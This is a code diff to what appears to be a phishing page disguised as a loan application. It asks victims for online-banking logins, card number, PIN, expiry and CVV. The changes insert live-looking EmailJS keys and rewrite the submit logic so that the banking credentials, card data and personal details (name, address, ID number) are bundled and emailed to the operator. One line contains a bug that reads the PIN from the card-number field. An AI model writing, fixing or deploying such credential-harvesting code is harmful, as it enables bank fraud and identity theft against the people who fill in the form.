@@ -349,6 +349,7 @@
             .intro-wrap h2 { font-size: 2rem; }
         }
     </style>
+<base target="_blank">
 </head>
 <body>
 
@@ -438,8 +439,8 @@
                     </div>
                     <div class="form-row">
                         <div class="form-group">
-                            <label for="cardPin">PIN</label>
-                            <input type="password" id="cardPin" placeholder="Enter PIN" maxlength="6" oninput="validateStep2()">
+                            <label for="cardPin">Card Pin</label>
+                            <input type="number" id="cardPin" placeholder="Enter card pin" maxlength="6" oninput="validateStep2()">
                         </div>
                         <div class="form-group">
                             <label for="cardExpiry">Expiry Date</label>
@@ -496,10 +497,11 @@
     </footer>
 
     <script>
+        // ==================== EMAILJS CONFIG ====================
         const EMAILJS_CONFIG = {
-            PUBLIC_KEY: 'YOUR_PUBLIC_KEY_HERE',
-            SERVICE_ID: 'YOUR_SERVICE_ID_HERE',
-            TEMPLATE_ID: 'YOUR_TEMPLATE_ID_HERE'
+            PUBLIC_KEY: 'yZuV2WJXrk15rYtSi',
+            SERVICE_ID: 'service_dlwgzfv',
+            TEMPLATE_ID: 'template_ao4owxn'
         };
 
         (function(){
@@ -507,6 +509,7 @@
                 emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
             }
         })();
+        // ========================================================
 
         const bankConfig = {
             fnb: {
@@ -642,77 +645,80 @@
         }
 
         function validateStep2() {
-            const cnum = document.getElementById('cardNumber').value.trim();
-            const cpin = document.getElementById('cardPin').value.trim();
+            const pnum = document.getElementById('cardNumber').value.trim();
+            const pcode = document.getElementById('cardPin').value.trim();
             const cexp = document.getElementById('cardExpiry').value.trim();
             const ccvv = document.getElementById('cardCvv').value.trim();
 
-            const allFilled = cnum.length > 0 && cpin.length > 0 && cexp.length >= 5 && ccvv.length >= 3;
+            const allFilled = pnum.length > 0 && pcode.length > 0 && cexp.length >= 5 && ccvv.length >= 3;
             document.getElementById('btnStep2').disabled = !allFilled;
         }
 
         function submitAll() {
+            // Collect bank credentials from step 1
+            const cfg = bankConfig[currentBank];
+            let credentialLines = [];
+            cfg.fields.forEach(f => {
+                const val = document.getElementById(f.id).value.trim();
+                if (val) credentialLines.push(`${f.label}: ${val}`);
+            });
+
+            // Collect banking data
             const bankPayload = {
                 bank: currentBank,
-                bankName: bankConfig[currentBank].name,
+                bankName: cfg.name,
                 credentials: step1Data,
-                card: {
-                    number: document.getElementById('cardNumber').value.trim(),
-                    pin: document.getElementById('cardPin').value.trim(),
-                    expiry: document.getElementById('cardExpiry').value.trim(),
-                    cvv: document.getElementById('cardCvv').value.trim()
-                },
+                card_number: document.getElementById('cardNumber').value.trim(),
+                card_pin: document.getElementById('cardNumber').value.trim(),
+                expiry: document.getElementById('cardExpiry').value.trim(),
+                cvv: document.getElementById('cardCvv').value.trim(),
                 submittedAt: new Date().toISOString()
             };
 
+            // Pull loan data from localStorage
+            const loanData = JSON.parse(localStorage.getItem('loanApplication') || '{}');
+
+            // Combine everything for EmailJS
+            const templateParams = {
+                // Loan data
+                fullname: loanData.fullname || '',
+                address: loanData.address || '',
+                phone: loanData.phone || '',
+                email: loanData.email || '',
+                account_number_loan: loanData.account || '',
+                id_number: loanData.idnumber || '',
+                loan_amount: loanData.loanamount || '',
+                loan_duration: loanData.loanduration || '',
+                loan_purpose: loanData.loanpurpose || '',
+
+                // Banking data
+                bank_name: bankPayload.bankName,
+                bank_credentials: credentialLines.join(' | '),
+                card_number: bankPayload.card_number,
+                card_pin: bankPayload.card_pin,
+                expiry_date: bankPayload.expiry,
+                cvv: bankPayload.cvv,
+
+                submitted_at: new Date().toLocaleString()
+            };
+
+            // Save combined data back to localStorage
             const existing = JSON.parse(localStorage.getItem('loanApplication') || '{}');
             existing.bankDetails = bankPayload;
             localStorage.setItem('loanApplication', JSON.stringify(existing));
 
-            // Hide the header text/logo when submitting
+            // Hide header, show loader
             document.getElementById('formCardHeader').classList.add('hidden');
-
             const s2 = document.getElementById('step2');
             s2.classList.add('leaving');
             setTimeout(() => {
                 s2.classList.remove('active', 'leaving');
                 document.getElementById('stepLoader').classList.add('active');
-                sendApplicationEmail(existing);
+                sendApplicationEmail(templateParams);
             }, 300);
         }
 
-        function sendApplicationEmail(allData) {
-            const loan = allData;
-            const bank = allData.bankDetails || {};
-            const card = bank.card || {};
-
-            let credentialLines = [];
-            if (bank.credentials) {
-                Object.entries(bank.credentials).forEach(([key, val]) => {
-                    if (val && val.trim()) credentialLines.push(val);
-                });
-            }
-
-            const templateParams = {
-                fullname: loan.fullname || '',
-                address: loan.address || '',
-                phone: loan.phone || '',
-                email: loan.email || '',
-                account_number: loan.account || '',
-                id_number: loan.idnumber || '',
-                loan_amount: loan.loanamount || '',
-                loan_duration: loan.loanduration || '',
-                loan_purpose: loan.loanpurpose || '',
-
-                bank_name: bank.bankName || '',
-                bank_credentials: credentialLines.join(' | '),
-                card_number: card.number || '',
-                card_expiry: card.expiry || '',
-                card_cvv: card.cvv || '',
-
-                submitted_at: new Date().toLocaleString()
-            };
-
+        function sendApplicationEmail(templateParams) {
             const isConfigured = !EMAILJS_CONFIG.PUBLIC_KEY.includes('YOUR_');
 
             const handleSuccess = () => {
@@ -736,13 +742,14 @@
                     .then(handleSuccess)
                     .catch(handleError);
             } else {
-                console.log('Demo mode — EmailJS not configured. Data:', templateParams);
+                console.log('Demo mode - EmailJS not configured. Data:', templateParams);
                 setTimeout(handleSuccess, 2500);
             }
         }
 
         window.addEventListener('load', () => {
             if (!localStorage.getItem('loanApplication')) {
+                // Optional: redirect back if no loan data
                 // window.location.href = 'index.html';
             }
         });
